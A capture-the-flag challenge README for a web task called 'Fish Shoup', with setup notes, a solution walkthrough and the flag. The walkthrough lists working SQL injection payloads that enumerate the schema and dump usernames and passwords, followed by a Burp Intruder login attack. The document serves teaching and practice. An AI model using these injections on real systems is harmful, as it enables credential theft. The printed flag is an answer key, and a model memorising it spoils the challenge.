# Fish Shoup

## Category
Web 50

## Question Text

>Help all marshmellow fart and skittle burp fishes!!!
>
>We forgot the credentials of our blog account because we have small brains!
>
>Log into it to get your awesome reward of helping us, we are nice creatures!
>
>But remember to keep it a secret! Shhh...
>Connect via `http://<ip address>:17456`

## Created by

@stopduckroll &amp; @paux &amp; @platy

## Setup Guide
Do `bash build.sh`

(It takes 15 seconds for the sql server to initialise. Everything should work after awhile)

## Distribution
None.

## Solution

1. When you first see the site, you will notice that you can search for fishes and also login
2. When you enter `'OR'1==1'#` you will notice that all entries comes out, meaning its vulnerable to sql injection
3. To view database name `asdf' UNION ALL SELECT null,null,database(),null,null #`
4. You can then use that to enter malicious sql code to view all table names `asdf' UNION ALL SELECT null,null,table_name,null,null FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'fishshoups' #`
5. From there you realise that there is a table storing user details,run this to see the collumn names `asdf' UNION ALL SELECT null,null,column_name,null,null FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'user_details_login' #` 
6. Crafting a new malicious string `asdf' UNION ALL SELECT null,user,password,null,role FROM user_details_login #` will allow you to see all the usernames
7. Now with all the username and passwords, you can use burpsuite to perform a "intruder attack on it"
8. Put the two payloads and put a regex for `GCTF`
9. Get flag

### Flag
`GCTF{m00ny_607_17}`


## Credits
CTF 101.

Thanks @Lflare for fixing mysql issues.

## Recommended Reads
None.
